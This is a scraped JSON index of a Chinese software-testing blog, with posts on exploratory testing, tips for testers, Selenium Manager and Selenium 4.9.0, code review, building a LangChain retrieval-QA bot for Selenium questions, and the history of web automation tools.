因此，作者建议在敏捷项目中使用结构化的测试方法，结合需求分析、测试设计、测试执行和测试评估等步骤，提高测试效率和质量。\n同时，也可以在适当的时机进行探索性测试，以补充结构化测试的不足。例如，在需求分析阶段，可以使用探索性测试来理解用户需求和业务流程；在回归测试阶段，可以使用探索性测试来检查系统的稳定性和完整性；在发布前阶段，可以使用探索性测试来模拟用户场景和操作。\n","date":"2023-05-06T15:00:09+08:00","permalink":"zh.ethanhan.cc/p/%E4%B8%BA%E4%BB%80%E4%B9%88%E6%8E%A2%E7%B4%A2%E6%B5%8B%E8%AF%95%E5%92%8C%E6%95%8F%E6%8D%B7%E9%A1%B9%E7%9B%AE%E5%85%AB%E5%AD%97%E4%B8%8D%E5%90%88/","title":"为什么探索测试和敏捷项目八字不合"},{"content":"理解业务 要深入理解业务领域和用户需求。这将有助于设计更好的测试场景,确保软件满足用户的需求。\n成为问题解决者 在开始自动化测试之前,要充分理解问题,思考如何解决它。作为一名SDET,您的工作不仅仅是将功能测试用例自动化,我们的工作是使测试过程更加高效,消除减慢过程并不必要消耗时间的瓶颈。\n保持开放的心态并愿意学习新事物 对测试人员来说,保持开放的心态和愿意学习新事物是至关重要的,因为软件测试领域不断发展。新技术,方法和工具不断涌现,测试人员需要随时了解这些发展,才能在其角色中保持效率。 开放的心态意味着接受新想法,新观点和新方法。测试人员应该对学习新测试技术,探索新工具和采用新方法持开放态度。他们也应该愿意尝试新方法和技术,看什么对他们和他们的团队最有效。 开明也意味着愿意质疑假设和先入为主的看法。测试人员不应该假定某种方法或工具始终是最佳选择。相反,他们应该愿意评估不同的选择,选择最适合情况的选择。 此外,开明意味着愿意接受反馈和批评。测试人员应该愿意接受同事和利益相关者的反馈,并用它来改进工作。他们也应该对测试方法持开放态度,如果需要的话,愿意作出改变。 总之,对测试人员来说,开明和愿意学习新事物对于在不断发展的领域保持相关性和效率至关重要。它使他们能够适应新挑战,保持创新,不断提高技能和知识\n别害怕提问或表达疑虑。 在软件测试中,提问和表达疑虑是工作的重要组成部分。测试人员负责识别软件中的缺陷和问题,他们常常需要寻求澄清或就需求,设计或功能提出疑虑。 提问是一种收集信息和澄清需求的方式。测试人员应该提出一些问题,以确保他们理解软件的预期行为,并发现需求中的任何歧义或缺口。这可以帮助确保软件能够满足用户和企业的需求。 表达疑虑对测试人员也很重要。如果测试人员发现软件中的潜在问题,他们应该向相关的利益相关者提出。这可能包括开发团队,项目经理或业务相关人员。及早表达疑虑可以帮助避免更大的问题。 测试人员不害怕提问或表达疑虑是非常重要的。测试人员应该感到自在地寻求澄清,质疑假设和识别潜在问题。这样做可以帮助确保软件满足用户和企业的需求,并按时在预算范围内交付。 总之,提问和表达疑虑是软件测试的关键部分。它有助于确保软件达到必要的标准,并根据用户和企业的需求进行开发。测试人员应该有权提出澄清和表达疑虑,以确保软件质量高。\n始终测试可用性——这和功能测试同样重要。 可用性测试是软件测试的关键部分,它和功能测试同样重要。可用性测试是评估产品的用户界面(UI)和用户体验(UX)的过程,以确保它对用户友好,高效和有效。 可用性测试的目的是识别任何可能阻止用户有效使用软件的可用性问题。这些问题可能包括混乱或杂乱的UI,响应时间慢,缺乏反馈或难以理解的错误信息。 可用性测试涉及观察用户与软件的交互,并要求他们执行特定任务。测试人员将寻找任何用户难以掌握或出错的地方,并收集有关软件可用性的反馈。 可用性测试至关重要,因为即使产品具有所有必要的功能,如果使用不便,用户很可能会感到沮丧和抛弃它。这可能导致收入损失,负面评论和对公司声誉的损害。 因此,可用性测试应该从一开始就集成到软件测试过程中。它应该与功能测试一起考虑,以确保软件满足用户需求并提供积极的用户体验。 总之,可用性测试与功能测试同样重要。测试人员应该通过测试UI和UX来确保软件对用户友好,高效和有效。这样做可以帮助确保软件满足用户需求并提供积极的用户体验。\n记录下每一件事情——这将有助于你和你的团队在将来。 :nerd_face:记录是软件测试的重要部分。它涉及创建和维护有关所有测试活动的记录,包括测试计划、测试案例、测试结果和缺陷。在测试过程中记录每一件事情至关重要,因为它将帮助测试人员和他们的团队在未来。 记录可以帮助测试人员跟踪他们的进度,找出潜在的问题和缺陷,并在整个测试过程中跟踪缺陷。通过记录每一件事情,测试人员可以轻松参考以前的测试活动,确保他们正在测试软件的正确区域。 记录每一件事情也有助于测试人员和他们的团队在未来。当新成员加入项目或软件需要更新或修改时,有记录可以帮助确保团队清楚了解已经测试了什么和还需要测试什么。 此外,记录有助于知识转移。当测试人员离开团队或项目时,他们创建的记录可以被替代者用于快速了解已经测试了什么和还需要测试什么。 而且,记录有助于通过提供缺陷及其解决方案的记录来提高软件质量。此信息可用于识别缺陷的模式或趋势,从而改进软件开发过程。 总之,在软件测试中记录每一件事情至关重要。它可以帮助测试人员跟踪进度,找出潜在的问题和跟踪缺陷。它也可以帮助团队在将来确保新成员了解已经测试了什么和还需要测试什么。最后,记录可以通过提供有价值的缺陷和解决方案信息来改进软件质量。\n制定测试计划并坚持执行。 制定测试计划是软件测试的基本步骤,它涉及定义测试目标、范围、方法和时间表。一个明确定义的测试计划为测试过程提供了清晰的路线图,并帮助测试人员专注于测试目标。 测试计划应概述测试目标和优先级以及要执行的具体测试任务。该计划还应确定测试环境、测试工具和技术以及预期结果。 通过制定测试计划,测试人员可以确保执行所有必要的测试任务,并且不遗漏任何关键区域。该计划也可以帮助测试人员更有效和高效地管理时间和资源。 然而,仅制定测试计划是不够的;坚持执行它同样重要。偏离测试计划可能导致测试不完整、错过缺陷和测试过程延迟。因此,测试人员应尽可能密切地遵循测试计划,仅在必要时和经过仔细考虑后进行调整。 坚持测试计划需要纪律、专注和注重细节。它涉及监控进度、识别与计划的任何偏差并在必要时采取纠正措施。 总之,制定测试计划对测试过程的成功至关重要。它为测试提供了路线图,并帮助测试人员专注于目标。但是,坚持计划同样重要,以确保测试所有关键区域,并有效和高效地完成测试过程。\n","date":"2023-04-26T10:39:49+08:00","permalink":"zh.ethanhan.cc/p/%E7%BB%99%E6%B5%8B%E8%AF%95%E4%BA%BA%E5%91%98%E7%9A%847%E6%9D%A1%E5%BB%BA%E8%AE%AE/","title":"给测试人员的7条建议"},{"content":"Selenium社区最近发布了Selenium Manager工具，主要是解决每隔一段时间就要重新去下载driver的痛点。当然了，这也是我痛点。因为chrome浏览器会自动更新的关系，之前我都是关掉自动更新从而回避去下载新driver的问题，不过因为用户的版本大多都是较新的，所以测试浏览器每隔一段时间还是要更新一下才比较好。我自己试用了一下，感觉还是很不错的，非常有意思的一个点是sm竟然是rust开发的，在我的印象里这种对性能和稳定性要求不是特别高的命令行用go开发和维护的话效率可能会更高一点。下面是官方blog的翻译以及我自己的一点点体验。\n大多数人使用 Selenium 的第一次经验都会出现这样的错误消息：\n1 java.lang.IllegalStateException: The path to the driver executable must be set by the webdriver.chrome.driver system property; for more information, see https://chromedriver.chromium.org/. The latest version can be downloaded from https://chromedriver.chromium.org/downloads 然后他们不得不在网上搜索有关如何处理他们下载的驱动程序的说明。\nSelenium：现在已经内置了驱动程序！ Selenium 项目希望改善用户体验，其中一项首要任务是帮助所有用户简化他们设置环境的方式。多年来，配置浏览器驱动程序一直是用户需要执行的任务，以便运行 Selenium。\n设置一次浏览器驱动程序并不那么复杂，但随着浏览器发布周期缩短，现在每4-6周就有一个新的 Chrome/Firefox/Edge 版本，使得保持浏览器驱动程序与浏览器版本同步的任务变得不那么容易了。\nSelenium Manager 是一个新的工具，可帮助轻松获得运行 Selenium 所需的工作环境。如果 Chrome、Firefox 或 Edge 不在 PATH 中，Selenium Manager Beta 1 将配置它们的浏览器驱动程序。\n要使用 Selenium 4.6 进行 Selenium 测试，只需安装 Chrome、Firefox 或 Edge 即可。如果您已经安装了浏览器驱动程序，则会忽略此功能。如果您想帮助我们测试它，请删除您的驱动程序或删除第三方驱动程序管理器，然后事情应该仍然“正常工作”。如果不行，请提交错误报告。\nSelenium Manager 的未来版本甚至会下载浏览器（如果有必要）。\n受开源和 Selenium 社区启发 Selenium Manager 不是完全新的解决方案。多年来， Selenium 生态系统中出现了几个第三方项目，例如：Java 的 WebDriverManager、Python 的 webdriver-manager、Ruby 的 webdrivers 和 C# 的 WebDriverManager.Net。\n所有这些项目都作为灵感，并清楚地表明社区需要在 Selenium 中内置此功能。此外，2021年1月进行的一项调查显示，大多数 Selenium 用户希望摆脱驱动程序管理问题。此外，驱动程序安装页面是 Selenium 文档中访问最多的页面。\n详细介绍 Selenium Manager Selenium Manager是一个命令行工具，用Rust语言开发，可在多个平台上运行。在其beta 1版本中，如果未检测到浏览器驱动程序或未使用第三方驱动程序管理器，则Selenium Manager将被Selenium绑定透明地调用。你也可以不使用Selenium绑定使用Selenium Manager。目前，二进制文件可以直接在Selenium的代码库中找到。运行以下命令以检查不同的参数和选项：\n1 $ ./selenium-manager --help 下面是一个快速的示例，演示如何配置ChromeDriver：\n1 2 $ ./selenium-manager --browser chrome INFO /home/boni/.cache/selenium/chromedriver/linux64/106.0.5249.61/chromedriver 如果你维护一个基于WebDriver的项目，并希望同时使用Selenium Manager，请加入我们的社区频道，我们将乐意提供帮助。如果你有兴趣进行贡献，请查看项目的README以获取详细的说明和信息。\n未来计划 未来将继续开发Selenium Manager，每个版本将添加新功能并修复错误。然而，你作为Selenium社区的一员，是这个新工具未来成功的关键部分。请通过我们的问题跟踪器报告想法或错误，并通过我们的社区频道加入讨论。期待你的反馈！\nHappy testing!\n简单体验 下载地址: https://github.com/SeleniumHQ/selenium/tree/trunk/common/manager\nselenium manager是命令行工具，所以必须在命令行中使用，下面是帮助选项。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 selenium-manager -h selenium-manager 1.0.0-M3 Selenium Manager is a CLI tool that automatically manages the browser/driver infrastructure required by Selenium. Usage: selenium-manager [OPTIONS] Options: -b, --browser \u0026lt;BROWSER\u0026gt; Browser name (chrome, firefox, edge, iexplorer, safari, or safaritp) -d, --driver \u0026lt;DRIVER\u0026gt; Driver name (chromedriver, geckodriver, msedgedriver, IEDriverServer, or safaridriver) -v, --driver-version \u0026lt;DRIVER_VERSION\u0026gt; Driver version (e.g., 106.0.5249.61, 0.31.0, etc.) -B, --browser-version \u0026lt;BROWSER_VERSION\u0026gt; Major browser version (e.g., 105, 106, etc. Also: beta, dev, canary -or nightly- is accepted) -P, --browser-path \u0026lt;BROWSER_PATH\u0026gt; Browser path (absolute) for browser version detection (e.g., /usr/bin/google-chrome, \u0026#34;/Applications/Google\\ Chrome.app/Contents/MacOS/Google\\ Chrome\u0026#34;, \u0026#34;C:\\\\Program Files\\\\Google\\\\Chrome\\\\Application\\\\chrome.exe\u0026#34;) -O, --output \u0026lt;OUTPUT\u0026gt; Output type: LOGGER (using INFO, WARN, etc.), JSON (custom JSON notation), or SHELL (Unix-like) [default: LOGGER] -p, --proxy \u0026lt;PROXY\u0026gt; HTTP proxy for network connection (e.g., https://myproxy.net:8080) -t, --timeout \u0026lt;TIMEOUT\u0026gt; Timeout for network requests (in seconds) [default: 120] -D, --debug Display DEBUG messages -T, --trace Display TRACE messages -c, --clear-cache Clear driver cache --driver-ttl \u0026lt;DRIVER_TTL\u0026gt; Set default driver ttl [default: 86400] --browser-ttl \u0026lt;BROWSER_TTL\u0026gt; Set default browser ttl [default: 0] --clear-metadata Clear metadata file -h, --help Print help -V, --version Print version 一般用法，指定浏览器路径以及driver类型，自动下载并配置driver。我也试过用浏览器的版本号来制定，不过似乎运行不起来。\n另外这个工具跟ruby的webdrivers扩展有冲突，大家可以二选一就好了。\n1 2 # windows可以用这个路径: \u0026#34;C:\\\\Program Files\\\\Google\\\\Chrome\\\\Application\\\\chrome.exe\u0026#34; ./selenium-manager -d chromedriver -P /Applications/Google\\ Chrome.app/Contents/MacOS/Google\\ Chrome ","date":"2023-04-25T11:54:30+08:00","permalink":"zh.ethanhan.cc/p/selenium-manager%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/","title":"Selenium Manager使用指南"},{"content":"我们非常高兴地宣布支持Java、.NET、Ruby、Python 和 Javascript 及 Grid 和 Internet Explorer Driver的 Selenium 4.9.0版本发布。所有内容的链接可以在我们的下载页面找到。\n重点如下: Chrome DevTools 支持现在是:v110、v111 和 v112(Firefox 仍然对所有版本使用 v85) Java 绑定的 Maven BOM。 通过 Selenium Grid 现在可以远程下载文件。 首先， Firefox 开始逐步废除 CDP，并用双向实现 (BiDi implementation) 替代它。 InvalidSelectorException 现在继承自 WebDriverException 而不是 NoSuchElementException。 发布了Selenium Manager, 这个工具可以使用浏览器选项中设置的信息来获取正确的浏览器driver。 在 Selenium Grid 中可以设置子路径,以获得自定义的 Grid URL。 在 Java版本和 Grid 中完全移除 Json Wire Protocol 支持。 ","date":"2023-04-25T11:48:29+08:00","permalink":"zh.ethanhan.cc/p/selenium-4.9.0-%E5%8F%91%E5%B8%83/","title":"Selenium 4.9.0 发布"},{"content":"翻译一篇关于code review的不错文章。\n原文地址: https://shecodesthecosmos.co.uk/2023/04/11/how-do-you-get-maximum-benefit-from-code-reviews\nCode Review是软件开发中常用的质量关和最佳实践之一，也可以看作是一种软件测试形式。\n当Code Review被设计和使用得当时，可以为软件产品质量带来巨大的好处：允许发现和修复缺陷、改善文档和对代码进行检查。但当Code Review被设计不当时，它们往往会成为开发人员和测试人员的负担和瓶颈。\n那么如何确保Code Review为团队和产品质量带来最大的好处呢？我有三个建议。\n自动化！自动化！自动化！ 利用自动化工具来简化审查过程，减轻审查者的工作量。许多Code Review中更标准和重复的元素都可以自动化：\n使用自动化测试套件检查功能，并确保在审查之前通过此套件。测试自动化工具通常会生成报告，如果需要，审查者可以快速分析这些报告。 使用 Linting 软件验证格式，以帮助确保代码按标准化和可读性的方式编写。 通过使用静态分析工具在编译之前分析代码，识别潜在的运行时缺陷。 通过自动化创建Code Review和需求之间的链接，确保代码的可追溯性。 这些检查可以集成到 CI/CD pipeline中，并在代码提交或创建拉取请求等事件触发执行。在审查人员甚至看到代码之前自动执行这些检查可以极大地减少执行审查所需的时间，也使Code Review更少重复和行政性工作。\n有许多 DevOps 和 CI/CD 软件可以支持这一点，可参考的示例包括 Azure DevOps、GitLab、Jenkins 和 Atlassian 工具套件。\n定义一个过程 当然，有些代码质量方面是无法自动检查的：检查文档是否完整并且合理，查看代码架构等。这是审查发挥最大价值的地方。为确保从Code Review中获得最大的质量，定义一个流程、指南、标准或清单供审查者在审查时使用，可以很有帮助。制定一个标准的检查清单可以帮助防止在审查过程中漏掉任何东西。\n这些流程或指导方针应该始终具备灵活性。Code Review的范围、规模和风险可能会大不相同，因此并非每个审查都需要进行所有检查。可能包括以下一些内容的Code Review清单：\n文档的合理性检查：文档是否有意义？是否存在任何漏洞？ 代码是否结构合理？ 代码中是否存在任何错误或潜在的安全风险？ 所有自动检查是否都通过？ 代码是否遵循您组织的最佳实践政策？（如果此检查无法自动化） 审查的代码大小是否过大？这非常重要！如果Code Review太大或太复杂，审查时间将大大增加。保持Code Review的简单性和小规模，可能使用单一职责原则来定义应被视为Code Review大小的项目。 利用审查作为学习机会 最后，不要忘记利用Code Review作为团队之间共享知识的机会。团队经常会陷入这样的习惯，即让同一组人员审查代码库的相似区域。这可能会导致两个问题：\n让同一人员一直审查相似的代码区域可能会导致疏忽，增加审查期间漏检缺陷和其他问题的风险。 这可能会加强信息和知识的孤立，增加关键人员风险。如果只有团队的少部分人员了解一段代码，如果这些团队成员不可用，这可能会导致连续性问题。 为了避免出现这些问题，将Code Review重新构想为知识共享练习。确保Code Review与团队的其他成员共享，可以帮助他们学习代码库的新区域。对代码的新视角也可能会引发对假设的质疑，找到更多缺陷，创新新的工作方式。这也是同行导师的好机会，为团队成员提供机会发展他们的沟通技巧，提高他们的编程能力。\n","date":"2023-04-24T10:39:04+08:00","permalink":"zh.ethanhan.cc/p/%E5%A6%82%E4%BD%95%E4%BB%8Ecode-review%E4%B8%AD%E8%8E%B7%E5%BE%97%E6%9C%80%E5%A4%A7%E7%9A%84%E6%94%B6%E7%9B%8A/","title":"如何从code review中获得最大的收益"},{"content":"这是chatgpt为我生成的3个标题，我选了第3个。\n利用 Langchain 和 GPT 实现 Selenium 机器人自动问答 向量化存储和检索：如何用相似度搜索匹配 Selenium 知识？ 索引构造与信息检索：让 ChatGPT 成为 Selenium 问答助手 之前有很多同学会问我一些有关selenium的问题，因为精力有限，不能一一回答。最近正好chatgpt为代表的生成式ai非常火爆，那么我们能不能训练一个有selenium知识的 机器人帮我回答问题呢？人的时间有限，但是机器人可以一直在线工作，妥妥的劳模了。\n经过一番调研，我发现langchain这个库也许可以祝我一臂之力。\n整体思路 整理思路很简单，就是gpt是预先训练好的模型，有自己的先见知识，这也是为什么我们问它问题它会给出答案的原因，因为它的模型里就固化了这些知识。然而gpt3模型用的数据应该是截止到2021年的，也就是2年多之前的数据了。尽管selenium总体得带速度不快，但这两年也多多少少发生了一些变化，直接用gpt模型的先见知识可能会造成一些回答不准确的情况。\n所以我们可以用gpt的两大能力，而不是先见知识。\n推断的能力。给出一些上下文，让gpt总结和推断问题的答案 生成内容的能力 所以现在问题就变成了如何给gpt”灌“入最近的selenium知识？\n其实我们可以在gpt的prompt里面加上一些实时的准确的上下文，然后让gpt去根据上下文内容实时的生成问题的答案，比如下面这个prompt\n1 2 3 4 5 6 7 8 9 你是selenium问答机器人，你的任务是根据我提供的selenium相关信息来回答用户提出的问题。忘掉你之前的学到的知识，只用我提供的信息去回答。如果问题超出了我提供的信息范围，你就回答不知道。 ============== selenium的一些最新的介绍 ... ... ... ============== 问题：selenium是什么？ 这样一来任务就变成了如何根据用户的问题搜索相关的selenium知识？ 这里就要用到向量化存储和检索了。\n向量化存储和检索 先看看chatgpt的解释吧。\n1 2 3 Q: 我是一个5岁的小孩，请给我解释一下什么是向量化存储和检索，要让我能看懂 A: 嘿，你好呀！向量化存储和检索是指将文本、图像或其他数据转换成一组数字，并使用这些数字来存储和查找信息。可以把这些数字看成是一个有很多数字的表格，每一个数字代表着这个信息的一个特征。比如说，对于一张图片，可以用数字来表示它的长宽、色彩等等特征。当我们需要查找信息时，可以用相似度来比较数字之间的差距，来找到和我们要查找的信息最相似的那一组数字，从而找到相关的信息。这个技术可以用在很多场合，比如说搜索引擎、推荐系统、图像识别和自然语言处理等等。 其实我们可以简单理解为相似度搜索。\n我们要处理的问题是：用户输入问题，然后根据相似度，找到最匹配的一些相关材料，然后返回这些内容。这种工作向量化索引和检索是可以帮我们很好的完成的。\n实现流程 这样我们可以把流程梳理清楚了，这里有两个流程，分别是爬一些selenium的数据，向量化之后存到向量化数据库里，可以理解成为是构造索引的过程；以及搜索用户提出的问题，给出相关答案，然后要求gpt生成内容，可以理解为信息检索和生成的过程。\n索引构造过程\n我随便在selenium的主页拿了3个页面的内容，分别是\nhttps://www.selenium.dev/documentation/overview/ https://www.selenium.dev/documentation/overview/components/ https://www.selenium.dev/documentation/overview/details/ 使用下面的js脚本可以直接拿到页面内容\n1 document.querySelector(\u0026#39;.td-content\u0026#39;).textContent 我把内容保存在了se.txt文件里。下面是流程的简单分析\n1 从se.txt中读取内容 -\u0026gt; 切分内容里的文本 -\u0026gt; 调用openai的向量化接口进行向量化 -\u0026gt; 将向量化过的内容保存在向量数据库中 检索及内容生成的过程\n1 调用openapi接口向量化用户问题 -\u0026gt; 在向量数据库中搜索相关答案 -\u0026gt; 将问题和答案合成为prompt发送给gpt3.5 -\u0026gt; 展示gpt返回的内容 代码实现 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 from langchain.chains import RetrievalQA from langchain.llms import OpenAI from langchain.document_loaders import TextLoader from langchain.embeddings import OpenAIEmbeddings from langchain.text_splitter import CharacterTextSplitter from langchain.vectorstores import Chroma import sys def create_index(): loader = TextLoader(\u0026#39;./se.txt\u0026#39;, encoding=\u0026#39;utf8\u0026#39;) documents = loader.load() text_splitter = CharacterTextSplitter(chunk_size=1000, chunk_overlap=0) docs = text_splitter.split_documents(documents) embeddings = OpenAIEmbeddings() # db = Chroma.from_documents(docs, embeddings) vectordb = Chroma.from_documents(documents=docs, embedding=embeddings, persist_directory=\u0026#39;.\u0026#39;) vectordb.persist() vectordb = None def query(question: str): # Load from existing index # Now we can load the persisted database from disk, and use it as normal. embeddings = OpenAIEmbeddings() vectordb = Chroma(persist_directory=\u0026#39;.\u0026#39;, embedding_function=embeddings) # docs = vectordb.similarity_search(question) # print(docs[0].page_content) retriever = vectordb.as_retriever(search_kwargs={\u0026#34;k\u0026#34;: 1}) qa = RetrievalQA.from_chain_type(llm=OpenAI(), chain_type=\u0026#34;stuff\u0026#34;, retriever=retriever) res = qa.run(question) print(\u0026#34;=\u0026#34; * 20) print(res) if __name__ == \u0026#34;__main__\u0026#34;: cmd = \u0026#34;q\u0026#34; if len(sys.argv) \u0026gt; 1: cmd = sys.argv[-1] if cmd in [\u0026#39;c\u0026#39;, \u0026#39;create\u0026#39;]: create_index() elif cmd in [\u0026#39;q\u0026#39;, \u0026#39;query\u0026#39;]: query(\u0026#34;how selenium control the browsers\u0026#34;) else: print(f\u0026#34;unsupport cmd {cmd}\u0026#34;) 下面是chatgpt对上面这段代码的解释\n这是一段 Python 代码，其目的是建立一个问答系统，可以对输入的自然语言问题进行回答。具体地，代码中使用了以下库和模块：\nlangchain.chains：其中包含了一个叫做 RetrievalQA 的类，该类封装了一个检索模型和一个答案提取模型，用于回答问题。 langchain.llms：其中包含了一个叫做 OpenAI 的类，用于连接 OpenAI API 并执行自然语言任务。 langchain.document_loaders：其中包含了一个叫做 TextLoader 的类，用于从本地文件系统中加载文档。 langchain.embeddings：其中包含了一个叫做 OpenAIEmbeddings 的类，用于计算文本的向量表示。 langchain.text_splitter：其中包含了一个叫做 CharacterTextSplitter 的类，用于将长文本切分为小段落。 langchain.vectorstores：其中包含了一个叫做 Chroma 的类，用于构建向量数据库，并提供了向量检索的功能。 代码中的 create_index 函数用于创建向量数据库，具体地，它首先使用 TextLoader 加载一个名为 se.txt 的文本文件，并使用 CharacterTextSplitter 将该文本文件分成多个小段落。然后，它使用 OpenAIEmbeddings 计算每个小段落的向量表示，并使用 Chroma 构建向量数据库，并将其持久化到本地文件系统中。\n代码中的 query 函数用于回答问题，具体地，它首先加载之前创建的向量数据库，并使用 Chroma 将输入的自然语言问题转化为向量表示，并在向量数据库中进行检索，找到最相关的文本段落。然后，它使用 RetrievalQA 类的实例对文本段落进行答案提取，并将结果打印输出到控制台。\n在 __main__ 函数中，代码首先解析命令行参数，如果没有参数或者参数为 q 或 query，则调用 query 函数回答问题；如果参数为 c 或 create，则调用 create_index 函数创建向量数据库；否则，打印错误信息。\n只能说解释的比我好。另外RetrievalQA这个类实际上是一问一答，并没有多轮对话的能力。\n效果 1 2 3 4 5 Q: How selenium control the browsers Using embedded DuckDB with persistence: data will be stored in: . ==================== Selenium controls web browsers by remotely controlling browser instances and emulating a user\u0026#39;s interaction with the browser. It allows users to simulate common activities such as entering text into fields, selecting drop-down values, checking boxes, and clicking links in documents. Additionally, it provides many other controls such as mouse movement, arbitrary JavaScript execution, and more. 如果不自己灌数据的话，这个问题的答案是这样的\n1 2 3 4 5 6 7 Selenium is an open-source testing tool that can control the browsers and automate web-based applications. Selenium uses the WebDriver protocol to control different browsers such as Chrome, Firefox, Safari, Internet Explorer, Edge, and Opera. When a test script interacts with Selenium\u0026#39;s API commands such as findElement(), click(), sendKeys(), etc., it creates a request using the WebDriver protocol. The request is then sent to a browser-specific driver (such as chromedriver.exe for Google Chrome), which interprets the command and sends instructions to the browser through its own API. The browser executes those instructions and returns results back to the driver. The driver then processes these results and sends them back to Selenium along with any relevant information about errors or exceptions encountered during execution. In summary, Selenium controls browsers by communicating directly with their respective drivers using protocols specific to those drivers in order to manipulate webpage elements programmatically. 看上去更好一点，但使用的是先见知识，不一定能保证正确性和实时性。不过对于这个问题，chatgpt生成的回答已经是非常完美了。\n总结 让chatgpt给我写个总结。\n这篇文章提出了使用生成式AI ChatGPT和LangChain库训练一个Selenium知识问答机器人的想法。机器人需要灌入最新的Selenium知识并使用向量化存储和检索来搜索相关材料以回答用户的问题。文章介绍了实现流程，包括爬取Selenium数据、向量化存储和检索、信息检索和生成内容。\n这项技术非常适合构建专有领域的知识库，比如法律咨询，医疗咨询等。另外配合一些代码切片的库还可以实现代码生成功能。\n总之AI技术可以让我们用非常低的成本实现一些之前很难去搞定的工作，确实挺有意思的。\n","date":"2023-04-21T11:16:06+08:00","permalink":"zh.ethanhan.cc/p/%E7%B4%A2%E5%BC%95%E6%9E%84%E9%80%A0%E4%B8%8E%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2-%E8%AE%A9chatgpt%E6%88%90%E4%B8%BAselenium%E9%97%AE%E7%AD%94%E5%8A%A9%E6%89%8B/","title":"索引构造与信息检索 让ChatGPT成为Selenium问答助手"},{"content":"首先这个标题不是我取的，是我喂了关键字让AI给取的，果然非常的标题党，让人印象深刻。\n先简单回顾一下web自动化测试的一些发展阶段\nQTP时代 很多年前QTP横空出世的时候，没有人会怀疑这种工具将是自动化测试的未来形态。使用者理论上不需要掌握任何编程语言就可以通过录制回放的方式实现web端的自动化测试。后来事实证明QTP向人们证明了自动化测试的可行性，然而其自身的一些限制让其渐渐被主流市场所抛弃。看看bing是怎么说的\n您好，这是Bing。QTP是QuickTest Professional的简称，是一种自动化软件测试工具，主要用于功能测试和回归测试 。QTP的优点有：\n支持多种编程语言和平台 基于关键字驱动的测试方法，易于编写和维护测试脚本 提供丰富的测试对象库和检查点，方便识别和验证被测系统的元素 可以与其他HP测试工具集成，实现全面的测试管理 QTP的缺点有：\n商业软件，价格昂贵 对于一些复杂的界面或控件，可能无法正确识别或操作 对于一些新技术或框架，可能需要安装额外的插件或补丁 对计算机资源的消耗较大，可能影响被测系统的性能 请注意，QTP在官网已被改名为UFT（Unified Functional Testing）统一功能测试 。\nselenium RC和waitir时代 后来的一段时间selenium和watir渐渐流行起来，这一次一切似乎是发生了倒退，相较于qtp提供的足够简单的录制回放模式，selenium rc和watir只能自己写代码去实现自动化里的每一步操作和断言，炫酷的未来似乎渐行渐远。看看chatgpt对selenium rc的评价，先声明这些评价内容不够准确，大家仅作为参考。\nSelenium RC（Remote Control）是一个自动化测试工具，以下是 Selenium RC 的优缺点：\n优点：\n跨浏览器和跨平台：Selenium RC 支持在多种浏览器和操作系统上执行测试脚本，包括 Windows、Linux、Mac OS 等。 支持多种编程语言：Selenium RC 支持多种编程语言，如 Java、C#、Python 等，使得测试人员可以使用他们最熟悉的编程语言编写测试脚本。 可以与其他工具集成：Selenium RC 可以与其他测试工具和开发工具集成，如 JUnit、TestNG、Eclipse 等，以增强测试的效率和准确性。 适合大型项目：Selenium RC 可以测试大型项目，包括 Web 应用程序和企业应用程序。 可以模拟真实用户行为：Selenium RC 可以模拟真实用户的行为，如单击、输入文本、选择下拉列表等，以确保应用程序的稳定性和可靠性。 缺点：\n速度较慢：Selenium RC 使用 JavaScript 与浏览器进行通信，速度比较慢，影响测试的执行效率。 对浏览器的支持有限：Selenium RC 支持的浏览器版本有限，对于最新的浏览器版本可能无法进行测试。 安装和配置较为繁琐：Selenium RC 的安装和配置相对比较繁琐，需要一定的技术知识和经验。 不支持并发测试：Selenium RC 不支持多线程和并发测试，可能需要在多台机器上进行测试。 不支持移动端应用测试：Selenium RC 不支持移动端应用程序测试，需要使用其他工具或者框架进行测试。 webdriver时代 后来就是webdriver一统江湖了，看看claude(chatgpt的竞品)对webdriver的评价。内容基本准确，不过没有提及webdriver的核心能力，就是统一了web自动化测试的标准，也就是所谓的webdriver协议。\nSelenium WebDriver 的优点有:\n跨浏览器支持:支持 Chrome,Firefox,Safari,IE 等主流浏览器,测试代码可以跨浏览器运行。 免费开源:Selenium 是开源免费工具,有很大的社区支持。 丰富的 API:Selenium 提供丰富的 API 用于测试 web 应用,可以操作浏览器,元素,cookies 等。 支持多种语言:Selenium 支持多种编程语言,如 Java,C#,Python,JavaScript 等。 平台与操作系统无关:Selenium 可以运行在 Windows,Mac,Linux 等不同的操作系统。 Selenium 的缺点有:\n不能测试移动端浏览器:Selenium 主要用于测试 web 应用,不能用于测试移动端浏览器。 学习曲线较陡:Selenium API 较多,学习起来比较困难,需要一定的学习成本。 执行速度较慢:与其他自动化测试工具相比,Selenium 的执行速度会慢一些。 无法处理 JS 库:Selenium 无法很好的处理某些 JS 库,如 React,Vue 等,在驱动这些界面时会有一定困难。 无法测试无界面场景:Selenium 需要依赖浏览器界面,无法测试 API,服务等无界面场景。 并发执行能力差:Selenium 驱动浏览器执行测试,如果测试用例量大并发执行会比较困难。 所以综上,Selenium 是一款优秀的自动化测试工具,但也有一定的不足之处,需要根据实际项目进行选择和使用\nplaywright及其他新一代工具 webdriver聚集于web自动化本身，但web自动化测试需要涵盖更多的方面，比如用例的组织，数据的存储，多浏览器并行测试，重试机制以及用例稳定性提升等，这就给了新一代测试工具的崛起提供了很好的土壤，可以让微软的bing评价一下自家的playwright。\nPlaywright是一种新一代的自动化测试工具，由微软公司于2020年初发布 。\nPlaywright的优点有：\n支持多种主流浏览器，包括Chromium、Firefox、WebKit等 支持多种平台，包括Windows、Linux、macOS等 支持多种编程语言，包括TypeScript、JavaScript、Python、.NET、Java等 支持无头模式和有头模式，以及移动端的模拟 提供了丰富的API和文档，方便编写和维护测试脚本 Playwright的缺点有：\n相对于Selenium等成熟的测试工具，Playwright还比较新，可能存在一些兼容性或稳定性的问题 Playwright需要安装额外的依赖包，可能增加了测试环境的复杂度 Playwright目前还不支持IE浏览器和Safari浏览器 二次开发的时代 